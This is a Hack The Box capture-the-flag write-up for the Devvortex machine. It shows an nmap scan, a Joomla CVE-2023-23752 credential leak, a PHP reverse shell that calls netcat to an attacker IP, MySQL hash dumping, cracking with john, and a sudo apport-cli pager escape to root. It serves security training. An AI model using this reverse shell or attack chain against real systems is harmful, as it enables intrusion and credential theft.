# #1 Introduction
<img width="693" alt="image" src="https://github.com/Mate0r/app.hackthebock.com/assets/94843357/5e8a6e39-1b45-4f2d-9c00-e963d999858c">

# #2 nmap

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx devvortex.htb
```

we run an nmap scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -sV -p- devvortex.htb
```

we got these open ports
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# #3 user.txt

## HTTP (port 80)

we found a domain name devvortex.htb in the source code of the page \
by enumerating subdomain, we found a subdomain named dev
dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 875ms]

by accessing the robots.txt in dev.devvortex.htb/robots.txt, we found there is a joomla cms running the website \

```bash
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

http://dev.devvortex.htb/administrator/manifests/files/joomla.xml
we found this is a 4.2.6 Joomla \

this version is vulnerable to an unauthenticated information disclosure \
Sources : \
https://www.exploit-db.com/exploits/51334\
https://github.com/Acceis/exploit-CVE-2023-23752\

with the script that can access to api, we can get the current informations \

```
──(parallels㉿kali)-[~/hacking/htb/Devvortex]
└─$ ./51334.py http://dev.devvortex.htb 
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```


we can connect with user lewis and password of database (reuse of credentials)\
<img width="1252" alt="image" src="https://github.com/Mate0r/app.hackthebock.com/assets/94843357/6ae88f75-f380-48a4-b4ac-176b4d23c6d9">

<img width="1231" alt="image" src="https://github.com/Mate0r/app.hackthebock.com/assets/94843357/888a43ec-371a-40ba-8ef3-04c39e748903">
<?php
system('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.42 6666 >/tmp/f');
?>

──(parallels㉿kali)-[~]
└─$ nc -lvnp 6666  
listening on [any] 6666 ...
connect to [10.10.15.42] from (UNKNOWN) [10.10.11.242] 44636
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@devvortex:~/dev.devvortex.htb$ ^Z
zsh: suspended  nc -lvnp 6666
                                                                                                                                                   
┌──(parallels㉿kali)-[~]
└─$ stty raw -echo;fg              
[1]  + continued  nc -lvnp 6666

www-data@devvortex:~/dev.devvortex.htb$



www-data@devvortex:/home/logan$ mysql -h localhost -u lewis -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 2732
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>


+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+----------+--------------------------------------------------------------+



┌──(parallels㉿kali)-[~]
└─$ john hash_logan --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X2])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tequieromucho    (logan)     
1g 0:00:00:20 DONE (2023-11-27 21:05) 0.04930g/s 69.23p/s 69.23c/s 69.23C/s moises..harry
Use the "--show" option to display all of the cracked passwords reliably
Session completed.


Sudo on /usr/bin/apport-cli

if we do a report on a PID, the binary use less by default pager\
since we sudo, we can get a bash shell by doing !bash when paging.
